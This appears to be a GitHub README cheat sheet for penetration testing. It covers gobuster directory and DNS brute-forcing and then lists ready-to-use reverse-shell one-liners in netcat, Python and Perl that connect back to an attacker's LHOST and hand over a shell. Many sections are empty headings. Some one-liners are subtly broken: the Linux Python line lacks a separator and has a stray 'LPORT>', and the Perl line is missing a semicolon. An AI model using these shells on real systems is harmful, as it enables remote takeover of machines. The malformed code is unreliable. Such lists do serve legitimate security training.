# HackingToolBox
![image](https://user-images.githubusercontent.com/62963762/78167617-0dbdc380-744f-11ea-926d-915dc78722a1.png)  
**RHOST** : Ip address of the target machine  
**RPORT** : Listening port of the target machine  
**LHOST** : Ip address of the auditor computer  
**LPORT** : Listening port of the auditor computer  


## Énumération
### Windows 
### Linux 
### Nmap
### FTP (File Transfer Protocol)
### SMB
### Web
**gobuster :** tool to bruteforce directory and file

  
`dir` mode :
  
```bash
gobuster dir -u http://RHOST -t 50 -w wordlist.txt -x .php,.html,.htm
```

```bash
Flags:
  -f, --addslash                      Append / to each request
  -c, --cookies string                Cookies to use for the requests
  -e, --expanded                      Expanded mode, print full URLs
  -x, --extensions string             File extension(s) to search for
  -r, --followredirect                Follow redirects
  -H, --headers stringArray           Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                          help for dir
  -l, --includelength                 Include the length of the body in the output
  -k, --insecuressl                   Skip SSL certificate verification
  -n, --nostatus                      Don't print status codes
  -P, --password string               Password for Basic Auth
  -p, --proxy string                  Proxy to use for requests [http(s)://host:port]
  -s, --statuscodes string            Positive status codes (will be overwritten with statuscodesblacklist if set) (default "200,204,301,302,307,401,403")
  -b, --statuscodesblacklist string   Negative status codes (will override statuscodes if set)
      --timeout duration              HTTP Timeout (default 10s)
  -u, --url string                    The target URL
  -a, --useragent string              Set the User-Agent string (default "gobuster/3.0.1")
  -U, --username string               Username for Basic Auth
      --wildcard                      Force continued operation when wildcard found

Global Flags:
  -z, --noprogress        Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
```

`dns` mode :
```bash
gobuster dns -d http://RHOST -t 50 -w wordlist.txt
```
```bash
Flags:
  -d, --domain string      The target domain
  -h, --help               help for dns
  -r, --resolver string    Use custom DNS server (format server.com or server.com:port)
  -c, --showcname          Show CNAME records (cannot be used with '-i' option)
  -i, --showips            Show IP addresses
      --timeout duration   DNS resolver timeout (default 1s)
      --wildcard           Force continued operation when wildcard found

Global Flags:
  -z, --noprogress        Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist 
```

## One-liner reverse shell
command to execute on the listener side to connect to the remote machine :
```bash
nc -lvp LPORT
```
### netcat
Linux : 
```bash
nc LHOST LPORT -e /bin/bash
```
Windows :
```bat
nc.exe LHOST LPORT -e cmd.exe
```
### python
Linux : 
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("LHOST",LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Windows : 
```bat
C:\Python26\python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);"
```
### perl
```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### bash
### php
### ruby
### telnet
### socat
### java

## Exploitation
### msfvenom
### metasploit
### searchsploit
### evil-winrm
### mimikatz


## Bruteforce
### John the ripper
### Hydra
